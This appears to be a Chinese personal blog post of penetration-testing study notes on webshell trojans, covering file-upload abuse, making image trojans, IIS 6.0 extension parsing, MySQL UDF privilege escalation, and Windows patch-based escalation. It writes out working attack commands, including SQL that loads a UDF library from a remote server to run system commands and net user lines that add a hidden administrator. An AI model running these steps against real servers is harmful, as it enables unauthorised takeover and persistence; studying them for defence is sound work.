---
title: trojan控制服务器
date: 2022-04-18 10:36:42
categories:
- CS
- security
tags:
- trojan
toc: true
---
**摘要：本文介绍了trojan,和常用的trojan工具**
<!-- more -->
# 前言

---
# 一.必备知识
文件上传漏洞：用户通过上传trojan文件，获得了管理网站/服务器的权限
关键点：网站必须提供上传功能，知道trojan上传路径，trojan能被执行
trojan:伪装成正常程序的恶意程序，一旦运行可以控制电脑
网页trojan:伪装成正常网页的恶意网页(如x.php)，一旦运行可以控制网站或服务器
webshell:一个文件，后缀名是asp,php,aspx等，功能是管理网站
小马：功能少，代码量小的trojan
大马：功能多，代码量大的trojan
通信过程：
```
1.输入网址
2.浏览器把网址发送给DNS服务器并解析出ip
3.浏览器拿到ip后，向那个ip服务器发起HTTP协议
4.服务器会得到浏览器请求，并做出响应
5.浏览器拿到响应，生成页面
```

# 二、制作图片trojan
一般网站都不允许上传asp,php,aspx等后缀的文件，所以我们要改成图片的格式
```
copy 原有图片.jpg/b + trojan.asp 要新生成的图片马.jpg
```
中间件(Nginx,Apache,Tomcat,IIS)：提供网站服务，并能解析webshell

IIS6.0漏洞:后缀名为cer,cdx,asa的文件，统一解析成asp。比如上传了1.cer，最后执行的名字是1.asp。所以把图片马的后缀改成cer

Apache解析php,Tomcat解析java

为什么不直接把ASP文件后缀名改成cer：每个文件都是有特征的

如何收集网站的中间件信息：Wappalyzer插件

# 三、找路径

# 四、管理webshell
管理webshell的工具：菜刀、蚁剑、冰蝎、格斯兰(kali默认安装了weevely,在命令行执行即可)

# 五、提权
```
通常我们在拥有一个webshell的时候，一般权限都是WEB容器权限(即中间件权限network service)。
因为我们上传木马是被中间件解析的，所以通过木马控制服务器现在的权限是中间件的权
限。中间件的权限是网站管理员设置的。如在iis就是iis用户组权限，在apache 就是
管理员权限，e一般都是权限较低，均可执行一些普通命令，如查看当前用户，网络信
息，ip信息等。如果我想进行内网渗透就必须将权限提权到最高，如系统权限 超级管理
员权限。更高的权限方便我们在后续的渗透中，扩大范围测试。
```
sqlmap中的os-shell也是同样原理，sql-shell  是数据库权限。
## UDF提权
UDF(User Defined Function用户自定义函数)。用户可以通过自定义函数实现在mysql中无法方便实现的功能，添加的新函数都可以在sql语句中调用，就像调用本机函数一样

udf.dll(windows)/udf.so(linux)是一个函数的脚本，这个脚本的作用是 提供了 mysql执行系统命令的功能。

条件：
```
MySQL数据库没有开启安全模式。
已知的数据库账号具有对MySQL数据库insert和delete的权限，最好是root最高权限。
shell有写入到数据库安装目录的权限。
```

```
udf.dll 如何处理
1、cmd命令行处理
certutil -encodehex -f -v udf64.dll w32x.txt 4 
2、数据库处理
select hex(load_file('/udf/udf64.so')) into dumpfile 'l64.hex';
3、远程包含导入
select load_file('//你的服务器/l64.so') into dumpfile 
'/www/server/mysql/lib/plugin/l64.so';
```
步骤：
```
1.select @@version_compile_os,@@version_compile_machine,@@version #判断版本
2.select @@plugin_dir ;     show variables like 'plugin%';#判断路径
3.select 0x3weqwe.. into dumpfile '/www/server/mysql/lib/plugin/1.so'
#写入文件
4.drop function sys_eval
create function sys_eval returns string soname '1.so';#生成函数
5.select sys_eval('whoami') #执行函数
```
![20220418164608](https://cdn.jsdelivr.net/gh/zhangsx19/PicBed/images_for_blogs20220418164608.png)

注意：
outfile函数可以导出多行，而dumpfile只能导出一行数据；
outfile函数在将数据写到文件里时有特殊的格式转换，而dumpfile则保持原数据格式

宝塔(可以短时间让电脑变成服务器，并增加安全防护)管理数据库：要知道端口->路径->登录进入管理网站->登录数据库->管理数据库
phpmyadmin：http://IP:888/pma

## 补丁查询
![20220418113823](https://cdn.jsdelivr.net/gh/zhangsx19/PicBed/images_for_blogs20220418113823.png)

0.当遇到连执行命令的权限都没有的时候，直接上传一个新的cmd.exe

1.执行`systeminfo`命令查询目标服务器打过哪些补丁，将执行结果复制放到[查询网站](https://i.hacking8.com/tiquan)->返回exp

2.找到哪些是可以利用的，得到system权限

3.创建用户
```bash
net user qiesi abc123 /add   #添加用户，默认普通用户没有登录远程服务器的权限
net user qiesi /delete #删除用户
net localgroup administrators qiesi /add  #将用户加入到管理员组
```

4.远程登录：在本地输入mstsc

找ip:在目标服务器命令行输入ping 目标网址(要删去http头)

在远程桌面连接输入ip或ip:3389 /admin

3389：有的时候远程连接的默认端口不是3389

/admin：有时遇到目标服务器连接不上，超出了最大允许连接范围->把别人挤掉

---
# 总结

---
# 参考资料
1.[udf提权](https://www.jianshu.com/p/536d7fccb852)